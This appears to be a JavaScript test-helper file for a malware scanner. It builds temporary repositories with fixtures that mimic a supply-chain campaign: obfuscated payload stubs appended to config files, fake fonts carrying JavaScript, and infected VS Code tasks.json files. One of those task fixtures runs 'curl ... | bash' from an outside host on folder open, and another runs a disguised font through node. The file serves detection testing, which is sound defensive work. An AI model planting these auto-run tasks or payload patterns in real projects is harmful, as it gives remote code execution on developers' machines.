/**
 * Test helpers: build throwaway repo trees in the OS temp dir, plus realistic
 * payload/font fixtures derived from the real signatures.
 */
import os from "node:os";
import path from "node:path";
import fs from "node:fs";
import fsp from "node:fs/promises";

const created = [];

/** Create a unique temp directory; auto-cleaned by cleanupAll(). */
export function mkTmpDir(prefix = "polin-test-") {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  created.push(dir);
  return dir;
}

/**
 * Write a map of { relativePath: string | Buffer } into `dir`.
 * @returns {Promise<string>} dir
 */
export async function writeFiles(dir, files) {
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    await fsp.mkdir(path.dirname(full), { recursive: true });
    await fsp.writeFile(full, content);
  }
  return dir;
}

/** Build a repo in a fresh temp dir from a file map. */
export async function makeRepo(files) {
  return writeFiles(mkTmpDir(), files);
}

export function cleanupAll() {
  for (const d of created.splice(0)) {
    try {
      fs.rmSync(d, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  }
}

// ─── Realistic payload fixtures (match src/signatures.js) ───────────────────────

export const LEGIT_CONFIG = `export default {\n  plugins: { tailwindcss: {}, autoprefixer: {} },\n};\n`;

export const ORIGINAL_PAYLOAD =
  `global['!']='8-270-2';var _$_1e42=["rmcej%otb%",2857687,2667686];` +
  `eval(String.fromCharCode(49,43,49));\n`;

export const ROTATED_PAYLOAD =
  `global['_V']='8-991';var MDy=["Cot%3t=shtP",1111436,3896884];` +
  `eval(String.fromCharCode(49,43,49));\n`;

// Looks like an appended obfuscated blob but matches no KNOWN signature/seed.
export const GENERIC_PAYLOAD =
  `global['zz']=42;var _$_abcd=[12,34,56,78,90];eval(atob('MSt1'));\n`;

// Confirmed 3rd variant ("EtherHiding"): dot-notation flag, no decoder array
// (inlined \uXXXX escapes instead), Ethereum RPC method literals, detached
// spawn+unref persistence. Structurally mirrors the real captured sample;
// the eval/spawn payload argument is the same harmless "1+1" placeholder
// used by ORIGINAL_PAYLOAD/ROTATED_PAYLOAD — never real shellcode.
export const ETHERHIDING_PAYLOAD =
  `global.i="A11--#";global.r=require;typeof module==="object"&&(global.m=module);` +
  `const http=require("\\u0068\\u0074\\u0074\\u0070");` +
  `function rc(n){return n;}rc("eth_getBlockByNumber");rc("eth_getTransactionCount");` +
  `eval(String.fromCharCode(49,43,49));` +
  `spawn("node",["-e",String.fromCharCode(49,43,49)],{detached:!0,stdio:"ignore"}).unref();\n`;

// Proves layer 2 GENERALIZES rather than being curve-fit to
// ETHERHIDING_PAYLOAD: a hypothetical "variant 4" sharing NONE of the exact
// signature/seed strings above, so it must NOT match the etherhiding
// JS_VARIANTS entry — but it uses dot notation + heavy \uXXXX-escape density
// (broadened heuristic, 2a) and fully-escaped RPC-method names + detached
// spawn (fingerprint, 2b, proving the unicode-decode step is load-bearing —
// without it this fixture's "eth_getBlockByNumber" would never match since
// it's escaped here, same as in the real sample's inconsistent escaping).
const HEAVY_ESCAPES = Array.from(
  { length: 40 },
  (_, i) => `\\u${(0x41 + (i % 26)).toString(16).padStart(4, "0")}`,
).join("");
const ESCAPED_RPC_METHOD = "eth_getBlockByNumber"
  .split("")
  .map((c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`)
  .join("");
export const FUTURE_VARIANT_PAYLOAD =
  `global.z9="${HEAVY_ESCAPES}";` +
  `const m="${ESCAPED_RPC_METHOD}";` +
  `const cp=require("child_process");` +
  `cp.spawn("node",["-e",String.fromCharCode(49,43,49)],{detached:!0,stdio:"ignore"}).unref();\n`;

// Legitimate, unicode-heavy i18n module — proves hasHeavyUnicodeEscapeDensity
// doesn't false-positive on ordinary internationalization code (sparse
// escapes among lots of plain text/keys).
export const LEGIT_I18N_MODULE = `export default {
  en: { greeting: "Caf\\u00e9 \\u2014 welcome!", currency: "\\u0024" },
  ja: { greeting: "\\u3053\\u3093\\u306b\\u3061\\u306f", currency: "\\u00a5" },
  fr: { greeting: "Bonjour \\u00e0 tous", currency: "\\u20ac" },
};
`;

export function infectedConfig(payload) {
  return LEGIT_CONFIG + "\n" + payload;
}

// ─── Font fixtures ──────────────────────────────────────────────────────────────

/**
 * Structurally valid WOFF2: correct magic, a declared length that matches the
 * actual byte length, and a non-zero table count. Inert padding.
 */
export function validWoff2(size = 64) {
  const buf = Buffer.alloc(Math.max(size, 16), 0x00);
  buf.write("wOF2", 0, "latin1");
  buf.writeUInt32BE(0x4f54544f, 4); // flavor: OTTO
  buf.writeUInt32BE(buf.length, 8); // total length == file size
  buf.writeUInt16BE(4, 12); // numTables (non-zero)
  return buf;
}

/**
 * Structurally valid OTTO sfnt with a single in-bounds table whose bytes embed
 * `extra` text. Used to prove that a genuine font is NOT flagged even when it
 * contains a license URL and a long base64-looking run — the exact bytes that
 * previously produced false positives on real commercial fonts.
 */
export function validSfnt(extra = "") {
  const numTables = 1;
  const dirEnd = 12 + numTables * 16;
  const body = Buffer.from(extra, "latin1");
  const buf = Buffer.alloc(dirEnd + body.length, 0x00);
  buf.write("OTTO", 0, "latin1"); // sfntVersion → otf
  buf.writeUInt16BE(numTables, 4);
  buf.write("CFF ", 12, "latin1"); // table tag
  buf.writeUInt32BE(0, 16); // checksum
  buf.writeUInt32BE(dirEnd, 20); // table offset (right after the directory)
  buf.writeUInt32BE(body.length, 24); // table length
  body.copy(buf, dirEnd);
  return buf;
}

/** A real-font byte pattern that used to trip the old heuristics: a vendor URL + a long base64-ish run. */
export const REAL_FONT_STRINGS =
  "Copyright. http://www.monotypeimaging.com " + "A".repeat(400);

/** Structurally valid font (default WOFF2), inert padding (no JS-like strings). */
export function goodFont() {
  return validWoff2(256);
}

/** Fake "font": no font magic + embedded JS payload → confirmed carrier. */
export function evilFont() {
  return Buffer.from(
    "global['!']='x';var _$_1e42=[1];eval(require('child_process').toString());function(){}",
    "latin1",
  );
}

// ─── .vscode fixtures ─────────────────────────────────────────────────────────────

export const LEGIT_TASKS = `{
  // Build tasks
  "version": "2.0.0",
  "tasks": [
    { "label": "build", "type": "shell", "command": "npm run build" },
    { "label": "test", "type": "npm", "script": "test" },
  ]
}
`;

export const INFECTED_TASKS = `{
  "version": "2.0.0",
  "tasks": [
    { "label": "build", "type": "shell", "command": "npm run build" },
    {
      "label": "[auto]",
      "type": "shell",
      "command": "curl -fsSL https://default-configuration.vercel.app/x | bash",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
`;

export const LEGIT_LAUNCH = `{
  "version": "0.2.0",
  "configurations": [
    { "type": "node", "request": "launch", "name": "Run", "program": "\${workspaceFolder}/index.js" }
  ]
}
`;

// Real-world PolinRider tasks.json: a folderOpen task that runs the payload font
// through node (no curl/URL — the old fetch-to-shell detector missed this).
export const INFECTED_TASKS_NODE = `{
  "version": "2.0.0",
  "configurations": [
    { "type": "node", "request": "launch", "name": "Run My Project" }
  ],
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2)",
      "isBackground": true,
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
`;
